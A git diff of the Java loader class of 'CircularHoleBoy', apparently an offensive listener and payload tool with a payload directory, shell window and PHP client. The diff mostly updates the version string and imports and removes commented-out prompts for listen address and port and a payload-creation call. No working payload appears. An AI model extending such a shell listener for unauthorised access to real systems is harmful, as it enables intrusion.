@@ -2,12 +2,17 @@ package net.wind;
 
 import net.wind.core.Config.MakeConfig;
 import net.wind.core.Listening.ListenMain;
+import net.wind.core.window.ShellWindow;
+import net.wind.test.payload;
 import net.wind.utils.HttpUtils;
 
 
+import javax.imageio.ImageIO;
+import java.awt.*;
 import java.io.*;
 import java.net.*;
 import java.util.*;
+import java.util.List;
 
 
 /**
@@ -21,7 +26,7 @@ public class BoyLoader {
     //梦开始的的地方
     //Load Infomation With Program
     public static String SoftWareName = "CircularHoleBoy";//圆孔小子
-    public static String ProgramVersion = "v10 Lite";
+    public static String ProgramVersion = "Version 1.00";
     public static String Author = "WindStream";
     public static String Team = "StreamLgiht";
     public static String sqlitSigh = File.separator;
@@ -29,14 +34,15 @@ public class BoyLoader {
     public static String WorkingDir = System.getProperty("user.dir");
     public static String phpClient = "";
     public static String sip;
-    public static String usedIP;
-    public static int userPort;
 
     //Build Main Class
-    public static void main(String[] args) throws IOException, InterruptedException {
+    public static void main(String[] args) throws IOException, InterruptedException, AWTException, URISyntaxException {
+
         //Use The LoaderText() to Show Boot Text
         LoaderText();
-
+        //print(String.valueOf(BoyLoader.class.getProtectionDomain().getCodeSource().getLocation().toURI()).replace("file:/",""));
+        //ShellWindow.buildShellWindow();
+        //Thread.sleep(999999999);
         //MakeConfig
         if(MakeConfig.isFirst()) {
             //startListen
@@ -46,21 +52,9 @@ public class BoyLoader {
             Scanner sc = new Scanner(System.in);
             print("For In ---> "+sip);
             print("For Out ---> "+getIp());
-            /*print(">>>Press The Listen Address:","");
-            usedIP = sc.next();
-            print(usedIP);
-            print(">>>Press The Listen Port[11451]:","");
-            userPort = sc.nextInt();
-            print(userPort);*/
 
             //MakePayload
             MakeConfig.makeconfigDir("Payload");
-
-            //MakePayload.createPayload(usedIP,userPort);
-
-            //MakeConfig
-            MakeConfig.makeconfigDir("Config");
-
             //forward to Listen
             ListenMain.StartListening();
         }
@@ -70,9 +64,8 @@ public class BoyLoader {
 
     //Load Info
     private static void LoaderText(){
-        print(SoftWareName + " | " +ProgramVersion+" && By StreamLgiht");
+        print(SoftWareName + " | " + ProgramVersion);
         print();
-
         //Load System Info
         {
             try {
@@ -101,13 +94,10 @@ public class BoyLoader {
         String IP = HttpUtils.doGet("http://ident.me/");
         return IP;
     }
-
-
     //Get The Name With Local System,return Like Windows 7
     private static String getLocalSystemName(){
         Properties sysProperty = System.getProperties();
         String systemName = sysProperty.getProperty("os.name");
-
         return systemName;
     }
 
@@ -144,9 +134,7 @@ public class BoyLoader {
         public static void print (String Info){
         System.out.print(Info + dend);
     }
-        public static void print ( boolean Info){
-        System.out.print(Info + dend);
-    }
+        public static void print ( boolean Info){System.out.print(Info + dend);}
         public static void print ( char Info){
         System.out.print(Info + dend);
     }
